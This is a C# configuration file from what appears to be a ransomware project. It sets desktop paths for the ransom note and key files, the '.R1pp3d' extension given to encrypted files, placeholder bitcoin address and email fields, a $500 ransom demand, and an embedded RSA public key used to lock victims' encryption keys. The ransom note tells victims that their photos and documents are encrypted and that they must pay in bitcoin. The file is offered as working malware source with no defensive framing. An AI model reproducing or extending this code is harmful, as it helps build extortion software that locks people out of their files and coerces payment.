using System.Reflection;
using System.Security.Cryptography;

namespace Shared
{
    public class Settings
    {
        public static readonly string DESKTOP_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
        public static readonly string NOTE_PATH = Utility.GetRandomPath(DESKTOP_FOLDER, ".txt");
        public static readonly string ENCRYPTED_PRIVATE_KEY = Utility.GetRandomPath(DESKTOP_FOLDER, ".txt");
        public static readonly string AES_KEYS_PATH = Utility.GetRandomPath(DESKTOP_FOLDER, ".txt");
        public static readonly string DECRYPTED_KEYS_PATH = Path.Combine(DESKTOP_FOLDER, "DecryptedKeys.txt");
        
        public static readonly string TEMPLATES_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.Templates);
        public static readonly string CURRENT_PATH = Assembly.GetEntryAssembly().Location;
        
        public const string DESKTOP_NOTE = @"If you see this text, then all of your files including your Photos, Documents, Videos... have been encrypted.
They are NO LONGER accessible.
Please save yourself a couple of hours, by not searching for a decryption service, because that won't work.

How to get my files back?
1) Create a Bitcoin wallet (if you don't have one)
2) Send {0}$ worth of bitcoin to this address: {1}
3) Send to {2} your Wallet ID and the following files: ""{3}"" + ""{4}"" and DO NOT modify them.
4) Further instructions will come later.

Please do not Modify, Rename or Delete the encrypted files or we might not be able to restore them.";
        public const string RANSOMWARE_EXTENSION = ".R1pp3d";
        public const string BTC_ADDRESS = "--ID--";
        public const string EMAIL = "--EMAIL--";
        public const decimal USD_AMOUNT = 500.157M;
        
        public const string STRING_SERVER_PUBLIC_KEY = @"<?xml version=""1.0"" encoding=""utf-16""?>
<RSAParameters xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" >
  <Exponent>AQAB</Exponent>
  <Modulus>3yGsQSqTJBH6f8dwKYCLH3lw+rDRL5WIhSS9juxNPb4NFIuaDHeXkbm++dlU7eK2A1Xi30E9DmbI1FSKs/IR1zV6mrGzrvjzjZpPbPPIL83WACFD1yShbJBl3bKOf8XStUhOBpc0opEMOkPvHBBWuBra8rVn6QiI+rosBQ/CX1eZ4q5XHm2j+5pfB2uuY2u5cIUqvPfSaoGysq8a1n2Mog4DAuJOt9ELeD7lFyPRjXoCHCXeXh4nh8/QgjI6OpnAm8O8uKjvzxBp4phOcxN3CEsCOEKEZbkiyZkO4WL+7vOAn4o3PhZk+/SXNWCYwaria5MnGWYB7C/0cFf9Q9SFVV9vKErOasOYkyfFg8POR3V9zBIyWN9drDNjcmqYCVZTow6xWTn0IPKa1DZCk9EkpVfrodBfP7MxLk3Pw/7oCIQdl67t1IuZldQbiAs/udEJQVrePzlCvgc4x2J7hjelyZsuyI/3uGBC8b1ZxMUGhkAdNuL77YCUeqzSQ7p9f3rjtOM4jgO5bVNPc6cjbTT10gmuZUUDzZRx4kG2vO/XdFxyOlVvUggf86sP3DuvLkpSsAx2tYd2VTsWscVb/whmjhwobr2BBpOpl/mnXqxolc5l/PYD9QyERywlL8jfDP3KWBQaraLGRr7ZpPJWKm+lsC7nGp+scnifoAaQvXFN9/U=</Modulus>
</RSAParameters>";
        
        public static readonly RSAParameters SERVER_PUBLIC_KEY = Utility.StringToKey(STRING_SERVER_PUBLIC_KEY);
    }
}
